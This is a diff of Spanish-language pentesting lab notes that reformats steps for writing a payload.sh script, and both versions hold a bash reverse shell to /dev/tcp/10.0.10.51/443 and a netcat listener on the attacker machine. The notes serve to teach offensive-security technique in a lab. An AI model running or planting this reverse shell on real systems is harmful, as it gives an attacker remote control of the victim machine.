@@ -65,19 +65,36 @@ Ejecutamos el comando en la máquina víctima (10.0.10.39) y esta establecerá u
 
 <!-- Estos comandos se suelen usar en máquinas Linux -->
 
-Nos movemos al directorio que queramos en mi caso `cd /home/kali/Desktop` ejecutamos:
+Nos movemos al directorio que queramos, por ejemplo:
 
-`nano payload.sh`
+```bash (Kali Linux)
+cd /home/kali/Desktop
+```
 
-dentro del script `payload.sh` ponemos esto: 
+Creamos el script `payload.sh`:
 
-`#!/bin/bash`
+```bash (Kali Linux)
+nano payload.sh
+```
 
-`bash -i >& /dev/tcp/10.0.10.51/443 0>&1`
+Dentro del archivo `payload.sh` pegamos lo siguiente:
 
-seguido de crear el script ejecutamos el comando nc para poder quedarnos a la escucha:
+```bash (Kali Linux)
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.10.51/443 0>&1
+```
 
-`sudo nc -nlvp 443`
+Guardamos y cerramos el archivo. Ahora, damos permisos de ejecución (opcional pero recomendable, esto Mario no lo explica, pero Copilot dice que es recomendable):
+
+```bash (Kali Linux)
+chmod +x payload.sh
+```
+
+Ponemos Netcat a la escucha en la máquina atacante:
+
+```bash (Kali Linux)
+sudo nc -nlvp 443
+```
 
 y desde la máquina atacante ejecutamos el siguiente comando:
 
